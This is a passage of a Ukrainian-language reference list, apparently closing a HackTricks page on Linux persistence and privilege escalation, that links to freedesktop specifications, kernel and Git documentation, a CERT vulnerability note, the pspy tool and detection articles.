- [22] [Асоціації MIME-застосунків](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Специфікація Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Специфікація Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Мова Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile криптографічного підсистеми Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: вразливість кешу сторінок AF_ALG у ядрі Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Документація Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Документація Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Документація з конфігурації Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Документація генераторів systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — розробка засобів виявлення загроз у Linux: механізми persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
